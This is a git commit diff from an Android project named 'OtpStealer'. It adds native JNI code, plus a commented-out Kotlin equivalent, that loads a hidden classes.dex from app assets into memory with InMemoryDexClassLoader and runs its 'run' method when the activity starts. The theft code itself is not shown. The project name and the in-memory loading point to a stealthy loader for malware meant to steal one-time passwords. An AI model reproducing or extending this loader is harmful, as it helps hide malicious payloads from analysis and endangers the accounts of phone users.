a464e8e5c1e6316f2a700bdb5e01b1439ea3fa13
David Bors <borsdavid@proton.me>
2025-05-16 14:09:24 +0300

    feat: load dex file via native code

--- OtpStealer/app/src/main/cpp/native-lib.cpp
+++ OtpStealer/app/src/main/cpp/native-lib.cpp
@@ -1,9 +1,8 @@
 #include <jni.h>
 #include <string>
-#include <android/log.h>
 #include <android/asset_manager.h>
 #include <android/asset_manager_jni.h>
-
+#include <android/log.h>
 
 #define LOG_TAG "DexLoaderJNI"
 #define LOGI(...) __android_log_print(ANDROID_LOG_INFO, LOG_TAG, __VA_ARGS__)
@@ -14,7 +13,41 @@ JNIEXPORT jstring JNICALL
 Java_com_example_otpstealer_MainActivity_stringFromJNI(
         JNIEnv* env,
         jobject thiz) {
+    jclass activityClass = env->GetObjectClass(thiz);
+    jmethodID getAssetsMethod = env->GetMethodID(activityClass, "getAssets", "()Landroid/content/res/AssetManager;");
+    jobject assetManagerObj = env->CallObjectMethod(thiz, getAssetsMethod);
+    AAssetManager* mgr = AAssetManager_fromJava(env, assetManagerObj);
 
-    return env->NewStringUTF("Hi from C++!");
+    // open DEX file from res/raw
+    AAsset* asset = AAssetManager_open(mgr, "classes.dex", AASSET_MODE_BUFFER);
+    if (!asset) {
+        LOGE("Failed to open DEX file");
+        return env->NewStringUTF("Failed to open DEX file");
+    }
+
+    off_t length = AAsset_getLength(asset);
+    const void* dexData = AAsset_getBuffer(asset);
+    if (!dexData) {
+        LOGE("Failed to read DEX data");
+        return env->NewStringUTF("Failed to read DEX data");
+    }
+
+    jobject dexBuffer = env->NewDirectByteBuffer((void*)dexData, length);
+
+    jmethodID getClassLoader = env->GetMethodID(activityClass, "getClassLoader", "()Ljava/lang/ClassLoader;");
+    jobject parentClassLoader = env->CallObjectMethod(thiz, getClassLoader);
+
+    jclass inMemoryDexClassLoaderClass = env->FindClass("dalvik/system/InMemoryDexClassLoader");
+    jmethodID inMemoryDexCtor = env->GetMethodID(inMemoryDexClassLoaderClass, "<init>", "(Ljava/nio/ByteBuffer;Ljava/lang/ClassLoader;)V");
+    jobject dexClassLoader = env->NewObject(inMemoryDexClassLoaderClass, inMemoryDexCtor, dexBuffer, parentClassLoader);
+
+    jclass classLoaderClass = env->GetObjectClass(dexClassLoader);
+    jmethodID loadClassMethod = env->GetMethodID(classLoaderClass, "loadClass", "(Ljava/lang/String;)Ljava/lang/Class;");
+    jstring className = env->NewStringUTF("com.example.MyPlugin");
+    jclass pluginClass = (jclass)env->CallObjectMethod(dexClassLoader, loadClassMethod, className);
+
+    jmethodID runMethod = env->GetStaticMethodID(pluginClass, "run", "()Ljava/lang/String;");
+    jstring result = (jstring)env->CallStaticObjectMethod(pluginClass, runMethod);
+
+    return result;
 }
-
--- OtpStealer/app/src/main/java/com/example/otpstealer/MainActivity.kt
+++ OtpStealer/app/src/main/java/com/example/otpstealer/MainActivity.kt
@@ -1,9 +1,11 @@
 package com.example.otpstealer
 
+import android.os.Build
 import android.os.Bundle
 import androidx.activity.ComponentActivity
 import androidx.activity.compose.setContent
 import androidx.activity.enableEdgeToEdge
+import androidx.annotation.RequiresApi
 import androidx.compose.foundation.layout.fillMaxSize
 import androidx.compose.foundation.layout.padding
 import androidx.compose.material3.*
@@ -12,6 +14,8 @@ import androidx.compose.ui.Modifier
 import androidx.compose.ui.tooling.preview.Preview
 import com.example.otpstealer.ui.theme.OtpStealerTheme
 import androidx.compose.ui.unit.dp
+import dalvik.system.InMemoryDexClassLoader
+import java.nio.ByteBuffer
 
 
 class MainActivity : ComponentActivity() {
@@ -24,9 +28,25 @@ class MainActivity : ComponentActivity() {
 
     external fun stringFromJNI(): String
 
+    @RequiresApi(Build.VERSION_CODES.O)
     override fun onCreate(savedInstanceState: Bundle?) {
         super.onCreate(savedInstanceState)
         enableEdgeToEdge()
+        val result = stringFromJNI()
+
+//        val inputStream = resources.openRawResource(R.raw.classes)
+//        val dexBytes = inputStream.readBytes()
+//
+//        val dexBuffer = ByteBuffer.allocateDirect(dexBytes.size)
+//        dexBuffer.put(dexBytes)
+//        dexBuffer.flip()
+//
+//        val classLoader = InMemoryDexClassLoader(dexBuffer, classLoader)
+//        val pluginClass = classLoader.loadClass("com.example.MyPlugin")
+//        val runMethod = pluginClass.getDeclaredMethod("run")
+//        val pluginInstance = pluginClass.getDeclaredConstructor().newInstance()
+//        val result = runMethod.invoke(pluginInstance) as String
+
         setContent {
             OtpStealerTheme {
                 Surface(
@@ -34,7 +54,7 @@ class MainActivity : ComponentActivity() {
                     color = MaterialTheme.colorScheme.background
                 ) {
                     Text(
-                        text = stringFromJNI(),
+                        text = result,
                         modifier = Modifier.padding(16.dp),
                         style = MaterialTheme.typography.bodyLarge
                     )
